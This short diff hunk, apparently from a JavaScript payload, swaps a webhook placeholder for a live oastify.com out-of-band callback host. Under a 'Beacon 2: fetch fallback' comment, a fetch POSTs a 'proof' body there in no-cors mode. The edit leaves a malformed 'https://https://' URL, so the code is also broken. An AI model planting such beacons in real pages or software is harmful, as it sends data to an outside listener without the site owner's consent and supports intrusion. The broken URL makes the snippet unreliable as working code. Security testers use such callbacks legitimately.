@@ -21,7 +21,7 @@
 
   // Beacon 2: fetch fallback
   try {
-    fetch("https://{WEBHOOK_URL}/b", {
+    fetch("https://https://j1lyucxvd6v9kdpuk4u75cy8wz2qqge5.oastify.com/b", {
       method: "POST",
       mode: "no-cors",
       body: proof
